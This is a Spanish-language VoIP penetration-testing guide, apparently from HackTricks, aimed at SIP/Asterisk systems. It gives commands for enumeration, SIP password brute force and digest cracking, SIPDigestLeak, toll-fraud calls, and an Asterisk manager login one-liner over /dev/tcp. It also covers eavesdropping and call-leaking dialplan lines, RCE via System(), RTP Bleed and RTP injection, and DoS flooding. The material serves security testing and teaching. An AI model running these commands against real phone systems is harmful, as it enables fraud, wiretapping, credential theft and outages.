# Pentesting VoIP

{{#include ../../banners/hacktricks-training.md}}


## Información Básica sobre VoIP

Para comenzar a aprender sobre cómo funciona VoIP, consulta:

{{#ref}}
basic-voip-protocols/
{{#endref}}

## Mensajes Básicos
```
Request name	Description								RFC references
------------------------------------------------------------------------------------------------------
REGISTER	Register a SIP user.							RFC 3261
INVITE		Initiate a dialog for establishing a call. 				RFC 3261
ACK		Confirm that an entity has received.					RFC 3261
BYE		Signal termination of a dialog and end a call.				RFC 3261
CANCEL		Cancel any pending request.						RFC 3261
UPDATE		Modify the state of a session without changing the state of the dialog.	RFC 3311
REFER		Ask recipient to issue a request for the purpose of call transfer.	RFC 3515
PRACK		Provisional acknowledgement.						RFC 3262
SUBSCRIBE	Initiates a subscription for notification of events from a notifier.	RFC 6665
NOTIFY		Inform a subscriber of notifications of a new event.			RFC 6665
PUBLISH		Publish an event to a notification server.				RFC 3903
MESSAGE		Deliver a text message.	Used in instant messaging applications.		RFC 3428
INFO		Send mid-session information that does not modify the session state.	RFC 6086
OPTIONS		Query the capabilities of an endpoint					RFC 3261
```
## Códigos de Respuesta

**1xx—Respuestas Provisionales**
```
100 Trying
180 Ringing
181 Call is Being Forwarded
182 Queued
183 Session Progress
199 Early Dialog Terminated
```
**2xx—Respuestas Exitosas**
```
200 OK
202 Accepted
204 No Notification
```
**3xx—Respuestas de Redirección**
```
300 Multiple Choices
301 Moved Permanently
302 Moved Temporarily
305 Use Proxy
380 Alternative Service
```
**4xx—Respuestas de Fallo del Cliente**
```
400 Bad Request
401 Unauthorized
402 Payment Required
403 Forbidden
404 Not Found
405 Method Not Allowed
406 Not Acceptable
407 Proxy Authentication Required
408 Request Timeout
409 Conflict
410 Gone
411 Length Required
412 Conditional Request Failed
413 Request Entity Too Large
414 Request-URI Too Long
415 Unsupported Media Type
416 Unsupported URI Scheme
417 Unknown Resource-Priority
420 Bad Extension
421 Extension Required
422 Session Interval Too Small
423 Interval Too Brief
424 Bad Location Information
425 Bad Alert Message
428 Use Identity Header
429 Provide Referrer Identity
430 Flow Failed
433 Anonymity Disallowed
436 Bad Identity-Info
437 Unsupported Certificate
438 Invalid Identity Header
439 First Hop Lacks Outbound Support
440 Max-Breadth Exceeded
469 Bad Info Package
470 Consent Needed
480 Temporarily Unavailable
481 Call/Transaction Does Not Exist
482 Loop Detected
483 Too Many Hops
484 Address Incomplete
485 Ambiguous
486 Busy Here
487 Request Terminated
488 Not Acceptable Here
489 Bad Event
491 Request Pending
493 Undecipherable
494 Security Agreement Required
```
**5xx—Respuestas de Fallo del Servidor**
```
500 Internal Server Error
501 Not Implemented
502 Bad Gateway
503 Service Unavailable
504 Server Time-out
505 Version Not Supported
513 Message Too Large
555 Push Notification Service Not Supported
580 Precondition Failure
```
**6xx—Respuestas de Fallo Global**
```
600 Busy Everywhere
603 Decline
604 Does Not Exist Anywhere
606 Not Acceptable
607 Unwanted
608 Rejected
```
## Enumeración de VoIP

### Números de Teléfono

Uno de los primeros pasos que un Red Team podría hacer es buscar números de teléfono disponibles para contactar con la empresa utilizando herramientas OSINT, búsquedas en Google o raspando las páginas web.

Una vez que tengas los números de teléfono, podrías usar servicios en línea para identificar al operador:

- [https://www.numberingplans.com/?page=analysis\&sub=phonenr](https://www.numberingplans.com/?page=analysis&sub=phonenr)
- [https://mobilenumbertracker.com/](https://mobilenumbertracker.com/)
- [https://www.whitepages.com/](https://www.whitepages.com/)
- [https://www.twilio.com/lookup](https://www.twilio.com/lookup)

Saber si el operador proporciona servicios de VoIP podría ayudarte a identificar si la empresa está utilizando VoIP... Además, es posible que la empresa no haya contratado servicios de VoIP, pero esté utilizando tarjetas PSTN para conectar su propia PBX VoIP a la red de telefonía tradicional.

Cosas como respuestas automáticas de música suelen indicar que se está utilizando VoIP.

### Google Dorks
```bash
# Grandstream phones
intitle:"Grandstream Device Configuration" Password
intitle:"Grandstream Device Configuration" (intext:password & intext:"Grandstream Device Configuration" & intext:"Grandstream Networks" | inurl:cgi-bin) -.com|org

# Cisco Callmanager
inurl:"ccmuser/logon.asp"
intitle:"Cisco CallManager User Options Log On" "Please enter your User ID and Password in the spaces provided below and click the Log On button"

# Cisco phones
inurl:"NetworkConfiguration" cisco

# Linksys phones
intitle:"Sipura SPA Configuration"

# Snom phones
intitle:"snom" intext:"Welcome to Your Phone!" inurl:line_login.htm

# Polycom SoundPoint IP & phones
intitle:"SoundPoint IP Configuration Utility - Registration"
"Welcome to Polycom Web Configuration Utility" "Login as" "Password"
intext: "Welcome to Polycom Web Configuration Utility" intitle:"Polycom - Configuration Utility" inurl:"coreConf.htm"
intitle:"Polycom Login" inurl:"/login.html"
intitle:"Polycom Login" -.com

# Elastix
intitle:"Elastix - Login page" intext:"Elastix is licensed under GPL"

# FreePBX
inurl:"maint/index.php?FreePBX" intitle: "FreePBX" intext:"FreePBX Admministration"
```
### Información OSINT

Cualquier otra enumeración OSINT que ayude a identificar el software VoIP que se está utilizando será útil para un Red Team.

### Enumeración de Red

- **`nmap`** es capaz de escanear servicios UDP, pero debido a la cantidad de servicios UDP que se están escaneando, es muy lento y puede no ser muy preciso con este tipo de servicios.
```bash
sudo nmap --script=sip-methods -sU -p 5060 10.10.0.0/24
```
- **`svmap`** de SIPVicious (`sudo apt install sipvicious`): Localizará servicios SIP en la red indicada.
- `svmap` es **fácil de bloquear** porque utiliza el User-Agent `friendly-scanner`, pero podrías modificar el código de `/usr/share/sipvicious/sipvicious` y cambiarlo.
```bash
# Use --fp to fingerprint the services
svmap 10.10.0.0/24 -p 5060-5070 [--fp]
```
- **`SIPPTS scan`** from [**sippts**](https://github.com/Pepelux/sippts)**:** El escáner SIPPTS es un escáner muy rápido para servicios SIP a través de UDP, TCP o TLS. Utiliza multihilo y puede escanear grandes rangos de redes. Permite indicar fácilmente un rango de puertos, escanear tanto TCP como UDP, usar otro método (por defecto usará OPTIONS) y especificar un User-Agent diferente (y más).
```bash
sippts scan -i 10.10.0.0/24 -p all -r 5060-5080 -th 200 -ua Cisco [-m REGISTER]

[!] IP/Network: 10.10.0.0/24
[!] Port range: 5060-5080
[!] Protocol: UDP, TCP, TLS
[!] Method to scan: REGISTER
[!] Customized User-Agent: Cisco
[!] Used threads: 200
```
- **metasploit**:
```
auxiliary/scanner/sip/options_tcp normal  No     SIP Endpoint Scanner (TCP)
auxiliary/scanner/sip/options     normal  No     SIP Endpoint Scanner (UDP)
```
#### Enumeración de Red Extra

El PBX también podría estar exponiendo otros servicios de red como:

- **69/UDP (TFTP)**: Actualizaciones de firmware
- **80 (HTTP) / 443 (HTTPS)**: Para gestionar el dispositivo desde la web
- **389 (LDAP)**: Alternativa para almacenar la información de los usuarios
- **3306 (MySQL)**: Base de datos MySQL
- **5038 (Manager)**: Permite usar Asterisk desde otras plataformas
- **5222 (XMPP)**: Mensajes usando Jabber
- **5432 (PostgreSQL)**: Base de datos PostgreSQL
- Y otros...

### Enumeración de Métodos

Es posible encontrar **qué métodos están disponibles** para usar en el PBX utilizando `SIPPTS enumerate` de [**sippts**](https://github.com/Pepelux/sippts)
```bash
sippts enumerate -i 10.10.0.10
```
### Analizando las respuestas del servidor

Es muy importante analizar los encabezados que un servidor nos envía, dependiendo del tipo de mensaje y encabezados que enviamos. Con `SIPPTS send` de [**sippts**](https://github.com/Pepelux/sippts) podemos enviar mensajes personalizados, manipulando todos los encabezados, y analizar la respuesta.
```bash
sippts send -i 10.10.0.10 -m INVITE -ua Grandstream -fu 200 -fn Bob -fd 11.0.0.1 -tu 201 -fn Alice -td 11.0.0.2 -header "Allow-Events: presence" -sdp
```
También es posible obtener datos si el servidor utiliza websockets. Con `SIPPTS wssend` de [**sippts**](https://github.com/Pepelux/sippts) podemos enviar mensajes WS personalizados.
```bash
sippts wssend -i 10.10.0.10 -r 443 -path /ws
```
### Enumeración de Extensiones

Las extensiones en un sistema PBX (Central Privada de Conmutación) se refieren a los **identificadores internos únicos asignados a líneas** telefónicas, dispositivos o usuarios individuales dentro de una organización o negocio. Las extensiones hacen posible **rutar llamadas dentro de la organización de manera eficiente**, sin la necesidad de números de teléfono externos individuales para cada usuario o dispositivo.

- **`svwar`** de SIPVicious (`sudo apt install sipvicious`): `svwar` es un escáner de líneas de extensión SIP PBX gratuito. En concepto, funciona de manera similar a los marcadores tradicionales al **adivinar un rango de extensiones o una lista dada de extensiones**.
```bash
svwar 10.10.0.10 -p5060 -e100-300 -m REGISTER
```
- **`SIPPTS exten`** de [**sippts**](https://github.com/Pepelux/sippts)**:** SIPPTS exten identifica extensiones en un servidor SIP. Sipexten puede verificar grandes rangos de red y puertos.
```bash
sippts exten -i 10.10.0.10 -r 5060 -e 100-200
```
- **metasploit**: También puedes enumerar extensiones/nombres de usuario con metasploit:
```
auxiliary/scanner/sip/enumerator_tcp  normal  No     SIP Username Enumerator (TCP)
auxiliary/scanner/sip/enumerator      normal  No     SIP Username Enumerator (UDP)
```
- **`enumiax` (`apt install enumiax`): enumIAX** es un enumerador de **fuerza bruta de nombres de usuario** del protocolo Inter Asterisk Exchange. enumIAX puede operar en dos modos distintos: Adivinanza Secuencial de Nombres de Usuario o Ataque de Diccionario.
```bash
enumiax -d /usr/share/wordlists/metasploit/unix_users.txt 10.10.0.10 # Use dictionary
enumiax -v -m3 -M3 10.10.0.10
```
## Ataques VoIP

### Fuerza Bruta de Contraseña - en línea

Habiendo descubierto el **PBX** y algunos **números de extensión/nombres de usuario**, un Red Team podría intentar **autenticarse a través del método `REGISTER`** a una extensión utilizando un diccionario de contraseñas comunes para realizar un ataque de fuerza bruta a la autenticación.

> [!CAUTION]
> Tenga en cuenta que un **nombre de usuario** puede ser el mismo que la extensión, pero esta práctica puede variar según el sistema PBX, su configuración y las preferencias de la organización...
>
> Si el nombre de usuario no es el mismo que la extensión, necesitará **descubrir el nombre de usuario para realizar el ataque de fuerza bruta**.

- **`svcrack`** de SIPVicious (`sudo apt install sipvicious`): SVCrack le permite descifrar la contraseña para un nombre de usuario/extensión específico en un PBX.
```bash
svcrack -u100 -d dictionary.txt udp://10.0.0.1:5080 #Crack known username
svcrack -u100 -r1-9999 -z4 10.0.0.1 #Check username in extensions
```
- **`SIPPTS rcrack`** de [**sippts**](https://github.com/Pepelux/sippts)**:** SIPPTS rcrack es un cracker de contraseñas remoto para servicios SIP. Rcrack puede probar contraseñas para varios usuarios en diferentes IPs y rangos de puertos.
```bash
sippts rcrack -i 10.10.0.10 -e 100,101,103-105 -w wordlist/rockyou.txt
```
- **Metasploit**:
- [https://github.com/jesusprubio/metasploit-sip/blob/master/sipcrack.rb](https://github.com/jesusprubio/metasploit-sip/blob/master/sipcrack.rb)
- [https://github.com/jesusprubio/metasploit-sip/blob/master/sipcrack_tcp.rb](https://github.com/jesusprubio/metasploit-sip/blob/master/sipcrack_tcp.rb)

### VoIP Sniffing

Si encuentras equipos de VoIP dentro de una **red Wifi abierta**, podrías **esnifar toda la información**. Además, si estás dentro de una red más cerrada (conectada por Ethernet o Wifi protegido) podrías realizar **ataques MitM como** [**ARPspoofing**](../../generic-methodologies-and-resources/pentesting-network/#arp-spoofing) entre el **PBX y la puerta de enlace** para esnifar la información.

Entre la información de la red, podrías encontrar **credenciales web** para gestionar el equipo, **extensiones** de usuario, **nombre de usuario**, direcciones **IP**, incluso **contraseñas hash** y **paquetes RTP** que podrías reproducir para **escuchar la conversación**, y más.

Para obtener esta información podrías usar herramientas como Wireshark, tcpdump... pero una **herramienta especialmente creada para esnifar conversaciones VoIP es** [**ucsniff**](https://github.com/Seabreg/ucsniff).

> [!CAUTION]
> Ten en cuenta que si **se utiliza TLS en la comunicación SIP** no podrás ver la comunicación SIP en claro.\
> Lo mismo sucederá si se utiliza **SRTP** y **ZRTP**, **los paquetes RTP no estarán en texto claro**.

#### Credenciales SIP (Fuerza Bruta de Contraseña - offline)

[Consulta este ejemplo para entender mejor una **comunicación SIP REGISTER**](basic-voip-protocols/sip-session-initiation-protocol.md#sip-register-example) para aprender cómo se están **enviando las credenciales**.

- **`sipdump`** y **`sipcrack`,** parte de **sipcrack** (`apt-get install sipcrack`): Estas herramientas pueden **extraer** de un **pcap** las **autenticaciones digest** dentro del protocolo SIP y **realizar fuerza bruta** sobre ellas.
```bash
sipdump -p net-capture.pcap sip-creds.txt
sipcrack sip-creds.txt -w dict.txt
```
- **`SIPPTS dump`** de [**sippts**](https://github.com/Pepelux/sippts)**:** SIPPTS dump puede extraer autenticaciones digest de un archivo pcap.
```bash
sippts dump -f capture.pcap -o data.txt
```
- **`SIPPTS dcrack`** de [**sippts**](https://github.com/Pepelux/sippts)**:** SIPPTS dcrack es una herramienta para descifrar las autenticaciones digest obtenidas con el volcado de SIPPTS.
```bash
sippts dcrack -f data.txt -w wordlist/rockyou.txt
```
- **`SIPPTS tshark`** de [**sippts**](https://github.com/Pepelux/sippts)**:** SIPPTS tshark extrae datos del protocolo SIP de un archivo PCAP.
```bash
sippts tshark -f capture.pcap [-filter auth]
```
#### Códigos DTMF

**No solo se pueden encontrar credenciales SIP** en el tráfico de red, también es posible encontrar códigos DTMF que se utilizan, por ejemplo, para acceder al **correo de voz**.\
Es posible enviar estos códigos en **mensajes SIP INFO**, en **audio** o dentro de **paquetes RTP**. Si los códigos están dentro de paquetes RTP, podrías cortar esa parte de la conversación y usar la herramienta multimo para extraerlos:
```bash
multimon -a DTMF -t wac pin.wav
```
### Llamadas Gratis / Configuraciones Incorrectas de Conexiones Asterisk

En Asterisk es posible permitir una conexión **desde una dirección IP específica** o desde **cualquier dirección IP**:
```
host=10.10.10.10
host=dynamic
```
Si se especifica una dirección IP, el host **no necesitará enviar solicitudes REGISTER** de vez en cuando (en el paquete REGISTER se envía el tiempo de vida, generalmente 30 minutos, lo que significa que en otro escenario el teléfono necesitará REGISTER cada 30 minutos). Sin embargo, necesitará tener puertos abiertos que permitan conexiones desde el servidor VoIP para recibir llamadas.

Para definir usuarios, se pueden definir como:

- **`type=user`**: El usuario solo puede recibir llamadas como usuario.
- **`type=friend`**: Es posible realizar llamadas como par y recibirlas como usuario (se utiliza con extensiones).
- **`type=peer`**: Es posible enviar y recibir llamadas como par (SIP-trunks).

También es posible establecer confianza con la variable insegura:

- **`insecure=port`**: Permite conexiones de pares validadas por IP.
- **`insecure=invite`**: No requiere autenticación para mensajes INVITE.
- **`insecure=port,invite`**: Ambos.

> [!WARNING]
> Cuando se utiliza **`type=friend`**, el **valor** de la variable **host** **no será utilizado**, por lo que si un administrador **configura incorrectamente un SIP-trunk** utilizando ese valor, **cualquiera podrá conectarse a él**.
>
> Por ejemplo, esta configuración sería vulnerable:\
> `host=10.10.10.10`\
> `insecure=port,invite`\
> `type=friend`

### Llamadas Gratuitas / Configuraciones Incorrectas de Contexto en Asterisco

En Asterisk, un **contexto** es un contenedor o sección nombrada en el plan de marcado que **agrupa extensiones, acciones y reglas relacionadas**. El plan de marcado es el componente central de un sistema Asterisk, ya que define **cómo se manejan y enrutan las llamadas entrantes y salientes**. Los contextos se utilizan para organizar el plan de marcado, gestionar el control de acceso y proporcionar separación entre diferentes partes del sistema.

Cada contexto se define en el archivo de configuración, típicamente en el archivo **`extensions.conf`**. Los contextos se denotan por corchetes, con el nombre del contexto encerrado dentro de ellos. Por ejemplo:
```bash
csharpCopy code[my_context]
```
Dentro del contexto, defines extensiones (patrones de números marcados) y las asocias con una serie de acciones o aplicaciones. Estas acciones determinan cómo se procesa la llamada. Por ejemplo:
```scss
[my_context]
exten => 100,1,Answer()
exten => 100,n,Playback(welcome)
exten => 100,n,Hangup()
```
Este ejemplo demuestra un contexto simple llamado "my_context" con una extensión "100". Cuando alguien marca 100, la llamada será contestada, se reproducirá un mensaje de bienvenida y luego la llamada será terminada.

Este es **otro contexto** que permite **llamar a cualquier otro número**:
```scss
[external]
exten => _X.,1,Dial(SIP/trunk/${EXTEN})
```
Si el administrador define el **contexto predeterminado** como:
```
[default]
include => my_context
include => external
```
> [!WARNING]
> Cualquiera podrá usar el **servidor para llamar a cualquier otro número** (y el administrador del servidor pagará por la llamada).

> [!CAUTION]
> Además, por defecto el archivo **`sip.conf`** contiene **`allowguest=true`**, entonces **cualquier** atacante sin **autenticación** podrá llamar a cualquier otro número.

- **`SIPPTS invite`** de [**sippts**](https://github.com/Pepelux/sippts)**:** SIPPTS invite verifica si un **servidor PBX nos permite hacer llamadas sin autenticación**. Si el servidor SIP tiene una configuración incorrecta, nos permitirá hacer llamadas a números externos. También puede permitirnos transferir la llamada a un segundo número externo.

Por ejemplo, si tu servidor Asterisk tiene una mala configuración de contexto, puedes aceptar solicitudes INVITE sin autorización. En este caso, un atacante puede hacer llamadas sin conocer ningún usuario/contraseña.
```bash
# Trying to make a call to the number 555555555 (without auth) with source number 200.
sippts invite -i  10.10.0.10 -fu 200 -tu 555555555 -v

# Trying to make a call to the number 555555555 (without auth) and transfer it to number 444444444.
sippts invite -i 10.10.0.10 -tu 555555555 -t 444444444
```
### Llamadas gratuitas / IVRS mal configurados

IVRS significa **Sistema de Respuesta de Voz Interactiva**, una tecnología de telefonía que permite a los usuarios interactuar con un sistema computarizado a través de entradas de voz o tonos de marcación. IVRS se utiliza para construir sistemas de **manejo automatizado de llamadas** que ofrecen una variedad de funcionalidades, como proporcionar información, enrutar llamadas y capturar entradas de usuarios.

IVRS en sistemas VoIP típicamente consiste en:

1. **Indicaciones de voz**: Mensajes de audio pregrabados que guían a los usuarios a través de las opciones del menú IVR e instrucciones.
2. **DTMF** (Dual-Tone Multi-Frequency) señalización: Entradas de tonos de marcación generadas al presionar teclas en el teléfono, que se utilizan para navegar a través de los menús IVR y proporcionar entradas.
3. **Enrutamiento de llamadas**: Dirigir llamadas al destino apropiado, como departamentos específicos, agentes o extensiones basadas en la entrada del usuario.
4. **Captura de entradas de usuario**: Recopilar información de los llamantes, como números de cuenta, ID de casos o cualquier otro dato relevante.
5. **Integración con sistemas externos**: Conectar el sistema IVR a bases de datos u otros sistemas de software para acceder o actualizar información, realizar acciones o activar eventos.

En un sistema VoIP Asterisk, puedes crear un IVR utilizando el plan de marcado (**`extensions.conf`** archivo) y varias aplicaciones como `Background()`, `Playback()`, `Read()`, y más. Estas aplicaciones te ayudan a reproducir indicaciones de voz, capturar entradas de usuario y controlar el flujo de llamadas.

#### Ejemplo de configuración vulnerable
```scss
exten => 0,100,Read(numbers,the_call,,,,5)
exten => 0,101,GotoIf("$[${numbers}"="1"]?200)
exten => 0,102,GotoIf("$[${numbers}"="2"]?300)
exten => 0,103,GotoIf("$[${numbers}"=""]?100)
exten => 0,104,Dial(LOCAL/${numbers})
```
El anterior es un ejemplo donde se le pide al usuario que **presione 1 para llamar** a un departamento, **2 para llamar** a otro, o **la extensión completa** si la conoce.\
La vulnerabilidad es el hecho de que la **longitud de la extensión indicada no se verifica, por lo que un usuario podría ingresar el tiempo de espera de 5 segundos de un número completo y se llamará.**

### Inyección de Extensión

Usando una extensión como:
```scss
exten => _X.,1,Dial(SIP/${EXTEN})
```
Donde **`${EXTEN}`** es la **extensión** que será llamada, cuando se **introduce la ext 101** esto es lo que sucedería:
```scss
exten => 101,1,Dial(SIP/101)
```
Sin embargo, si **`${EXTEN}`** permite introducir **más que números** (como en versiones anteriores de Asterisk), un atacante podría introducir **`101&SIP123123123`** para llamar al número de teléfono 123123123. Y este sería el resultado:
```scss
exten => 101&SIP123123123,1,Dial(SIP/101&SIP123123123)
```
Por lo tanto, se enviará una llamada a la extensión **`101`** y **`123123123`** y solo la primera que reciba la llamada se establecerá... pero si un atacante utiliza una **extensión que elude cualquier coincidencia** que se esté realizando pero no existe, podría **inyectar una llamada solo al número deseado**.

## Vulnerabilidad SIPDigestLeak

La vulnerabilidad SIP Digest Leak es una vulnerabilidad que afecta a un gran número de teléfonos SIP, incluidos tanto teléfonos IP de hardware como de software, así como adaptadores de teléfono (VoIP a analógico). La vulnerabilidad permite **la filtración de la respuesta de autenticación Digest**, que se calcula a partir de la contraseña. Un **ataque de contraseña fuera de línea es entonces posible** y puede recuperar la mayoría de las contraseñas basadas en la respuesta al desafío.

**[Escenario de vulnerabilidad desde aquí**](https://resources.enablesecurity.com/resources/sipdigestleak-tut.pdf):

1. Un teléfono IP (víctima) está escuchando en cualquier puerto (por ejemplo: 5060), aceptando llamadas telefónicas
2. El atacante envía una INVITE al teléfono IP
3. El teléfono de la víctima comienza a sonar y alguien contesta y cuelga (porque nadie responde el teléfono en el otro extremo)
4. Cuando se cuelga el teléfono, el **teléfono de la víctima envía un BYE al atacante**
5. El **atacante emite una respuesta 407** que **pide autenticación** y emite un desafío de autenticación
6. El **teléfono de la víctima proporciona una respuesta al desafío de autenticación** en un segundo BYE
7. El **atacante puede entonces realizar un ataque de fuerza bruta** en la respuesta al desafío en su máquina local (o red distribuida, etc.) y adivinar la contraseña

- **SIPPTS leak** de [**sippts**](https://github.com/Pepelux/sippts)**:** La filtración SIPPTS explota la vulnerabilidad SIP Digest Leak que afecta a un gran número de teléfonos SIP. La salida se puede guardar en formato SipCrack para realizar un ataque de fuerza bruta utilizando SIPPTS dcrack o la herramienta SipCrack.
```bash
sippts leak -i 10.10.0.10

[!] Target: 10.10.0.10:5060/UDP
[!] Caller: 100
[!] Callee: 100

[=>] Request INVITE
[<=] Response 100 Trying
[<=] Response 180 Ringing
[<=] Response 200 OK
[=>] Request ACK
... waiting for BYE ...
[<=] Received BYE
[=>] Request 407 Proxy Authentication Required
[<=] Received BYE with digest
[=>] Request 200 Ok

Auth=Digest username="pepelux", realm="asterisk", nonce="lcwnqoz0", uri="sip:100@10.10.0.10:56583;transport=UDP", response="31fece0d4ff6fd524c1d4c9482e99bb2", algorithm=MD5
```
### Click2Call

Click2Call permite a un **usuario web** (que por ejemplo podría estar interesado en un producto) **introducir** su **número de teléfono** para ser llamado. Luego se llamará a un comercial, y cuando él **conteste el teléfono**, el usuario será **llamado y conectado con el agente**.

Un perfil común de Asterisk para esto es:
```scss
[web_user]
secret = complex_password
deny = 0.0.0.0/0.0.0.0
allow = 0.0.0.0/0.0.0.0
displayconnects = yes
read = system,call,log,verbose,agent,user,config,dtmf,reporting,crd,diapla
write = system,call,agent,user,config,command,reporting,originate
```
- El perfil anterior permite que **CUALQUIER dirección IP se conecte** (si se conoce la contraseña).
- Para **organizar una llamada**, como se especificó anteriormente, **no se necesitan permisos de lectura** y **solo** se necesita **originar** en **escritura**.

Con esos permisos, cualquier IP que conozca la contraseña podría conectarse y extraer demasiada información, como:
```bash
# Get all the peers
exec 3<>/dev/tcp/10.10.10.10/5038 && echo -e "Action: Login\nUsername:test\nSecret:password\nEvents: off\n\nAction:Command\nCommand: sip show peers\n\nAction: logoff\n\n">&3 && cat <&3
```
**Se podría solicitar más información o acciones.**

### **Escucha clandestina**

En Asterisk es posible usar el comando **`ChanSpy`** indicando la(s) **extensión(es) a monitorear** (o todas ellas) para escuchar las conversaciones que están ocurriendo. Este comando debe ser asignado a una extensión.

Por ejemplo, **`exten => 333,1,ChanSpy('all',qb)`** indica que si **llamas** a la **extensión 333**, **monitoreará** **`todas`** las extensiones, **comenzará a escuchar** cada vez que inicie una nueva conversación (**`b`**) en modo silencioso (**`q`**) ya que no queremos interactuar en ella. Podrías pasar de una conversación a otra presionando **`*`**, o marcando el número de extensión.

También es posible usar **`ExtenSpy`** para monitorear solo una extensión.

En lugar de escuchar las conversaciones, es posible **grabarlas en archivos** usando una extensión como:
```scss
[recorded-context]
exten => _X.,1,Set(NAME=/tmp/${CONTEXT}_${EXTEN}_${CALLERID(num)}_${UNIQUEID}.wav)
exten => _X.,2,MixMonitor(${NAME})
```
Las llamadas se guardarán en **`/tmp`**.

También podrías hacer que Asterisk **ejecute un script que filtrará la llamada** cuando se cierre.
```scss
exten => h,1,System(/tmp/leak_conv.sh &)
```
### Vulnerabilidad RTCPBleed

**RTCPBleed** es un problema de seguridad importante que afecta a los servidores VoIP basados en Asterisk (publicado en 2017). La vulnerabilidad permite que el **tráfico RTP (Protocolo de Tiempo Real)**, que transporta conversaciones VoIP, sea **interceptado y redirigido por cualquier persona en Internet**. Esto ocurre porque el tráfico RTP elude la autenticación al navegar a través de firewalls NAT (Traducción de Direcciones de Red).

Los proxies RTP intentan abordar las **limitaciones de NAT** que afectan a los sistemas RTC al hacer proxy de flujos RTP entre dos o más partes. Cuando hay NAT en su lugar, el software del proxy RTP a menudo no puede confiar en la información de IP y puerto RTP recuperada a través de la señalización (por ejemplo, SIP). Por lo tanto, varios proxies RTP han implementado un mecanismo donde tal **tupla de IP y puerto se aprende automáticamente**. Esto se hace a menudo inspeccionando el tráfico RTP entrante y marcando la IP y el puerto de origen para cualquier tráfico RTP entrante como el que debe ser respondido. Este mecanismo, que puede llamarse "modo de aprendizaje", **no utiliza ningún tipo de autenticación**. Por lo tanto, **los atacantes** pueden **enviar tráfico RTP al proxy RTP** y recibir el tráfico RTP proxied destinado al llamador o al receptor de un flujo RTP en curso. Llamamos a esta vulnerabilidad RTP Bleed porque permite a los atacantes recibir flujos de medios RTP destinados a ser enviados a usuarios legítimos.

Otro comportamiento interesante de los proxies RTP y las pilas RTP es que a veces, **incluso si no son vulnerables a RTP Bleed**, **aceptarán, reenviarán y/o procesarán paquetes RTP de cualquier fuente**. Por lo tanto, los atacantes pueden enviar paquetes RTP que pueden permitirles inyectar su medio en lugar del legítimo. Llamamos a este ataque inyección RTP porque permite la inyección de paquetes RTP ilegítimos en flujos RTP existentes. Esta vulnerabilidad puede encontrarse tanto en proxies RTP como en puntos finales.

Asterisk y FreePBX han utilizado tradicionalmente la **configuración `NAT=yes`**, que permite que el tráfico RTP eluda la autenticación, lo que puede llevar a que no haya audio o a audio unidireccional en las llamadas.

Para más información, consulta [https://www.rtpbleed.com/](https://www.rtpbleed.com/)

- **`SIPPTS rtpbleed`** de [**sippts**](https://github.com/Pepelux/sippts)**:** SIPPTS rtpbleed detecta la vulnerabilidad RTP Bleed enviando flujos RTP.
```bash
sippts rtpbleed -i 10.10.0.10
```
- **`SIPPTS rtcpbleed`** de [**sippts**](https://github.com/Pepelux/sippts)**:** SIPPTS rtcpbleed detecta la vulnerabilidad RTP Bleed enviando flujos RTCP.
```bash
sippts rtcpbleed -i 10.10.0.10
```
- **`SIPPTS rtpbleedflood`** de [**sippts**](https://github.com/Pepelux/sippts)**:** SIPPTS rtpbleedflood explota la vulnerabilidad RTP Bleed enviando flujos RTP.
```bash
sippts rtpbleedflood -i 10.10.0.10 -p 10070 -v
```
- **`SIPPTS rtpbleedinject`** de [**sippts**](https://github.com/Pepelux/sippts)**:** SIPPTS rtpbleedinject explota la vulnerabilidad RTP Bleed inyectando un archivo de audio (formato WAV).
```bash
sippts rtpbleedinject -i 10.10.0.10 -p 10070 -f audio.wav
```
### RCE

En Asterisk, de alguna manera logras **agregar reglas de extensión y recargarlas** (por ejemplo, comprometiendo un servidor de administrador web vulnerable), es posible obtener RCE utilizando el comando **`System`**.
```scss
same => n,System(echo "Called at $(date)" >> /tmp/call_log.txt)
```
Hay un comando llamado **`Shell`** que podría usarse **en lugar de `System`** para ejecutar comandos del sistema si es necesario.

> [!WARNING]
> Si el servidor **no permite el uso de ciertos caracteres** en el comando **`System`** (como en Elastix), verifica si el servidor web permite **crear archivos de alguna manera dentro del sistema** (como en Elastix o trixbox), y úsalo para **crear un script de puerta trasera** y luego usa **`System`** para **ejecutar** ese **script**.

#### Archivos locales interesantes y permisos

- **`sip.conf`** -> Contiene la contraseña de los usuarios SIP.
- Si el **servidor Asterisk se está ejecutando como root**, podrías comprometer root.
- El **usuario root de mysql** podría **no tener ninguna contraseña**.
- esto podría usarse para crear un nuevo usuario mysql como puerta trasera.
- **`FreePBX`**
- **`amportal.conf`** -> Contiene la contraseña del administrador del panel web (FreePBX).
- **`FreePBX.conf`** -> Contiene la contraseña del usuario FreePBXuser utilizado para acceder a la base de datos.
- esto podría usarse para crear un nuevo usuario mysql como puerta trasera.
- **`Elastix`**
- **`Elastix.conf`** -> Contiene varias contraseñas en texto claro como la contraseña de root de mysql, la contraseña de IMAPd, la contraseña del administrador web.
- **Varios folders** pertenecerán al usuario asterisk comprometido (si no se ejecuta como root). Este usuario puede leer los archivos anteriores y también controla la configuración, por lo que podría hacer que Asterisk cargue otros binarios con puerta trasera al ejecutarse.

### Inyección RTP

Es posible insertar un **`.wav`** en las conversaciones utilizando herramientas como **`rtpinsertsound`** (`sudo apt install rtpinsertsound`) y **`rtpmixsound`** (`sudo apt install rtpmixsound`).

O podrías usar los scripts de [http://blog.pepelux.org/2011/09/13/inyectando-trafico-rtp-en-una-conversacion-voip/](http://blog.pepelux.org/2011/09/13/inyectando-trafico-rtp-en-una-conversacion-voip/) para **escanear conversaciones** (**`rtpscan.pl`**), enviar un `.wav` a una conversación (**`rtpsend.pl`**) e **insertar ruido** en una conversación (**`rtpflood.pl`**).

### DoS

Hay varias formas de intentar lograr DoS en servidores VoIP.

- **`SIPPTS flood`** de [**sippts**](https://github.com/Pepelux/sippts)\*\*: SIPPTS flood envía mensajes ilimitados al objetivo.
- `sippts flood -i 10.10.0.10 -m invite -v`
- **`SIPPTS ping`** de [**sippts**](https://github.com/Pepelux/sippts)\*\*: SIPPTS ping realiza un ping SIP para ver el tiempo de respuesta del servidor.
- `sippts ping -i 10.10.0.10`
- [**IAXFlooder**](https://www.kali.org/tools/iaxflood/): DoS protocolo IAX utilizado por Asterisk.
- [**inviteflood**](https://github.com/foreni-packages/inviteflood/blob/master/inviteflood/Readme.txt): Una herramienta para realizar inundaciones de mensajes SIP/SDP INVITE sobre UDP/IP.
- [**rtpflood**](https://www.kali.org/tools/rtpflood/): Envía varios paquetes RTP bien formados. Es necesario conocer los puertos RTP que se están utilizando (sniff primero).
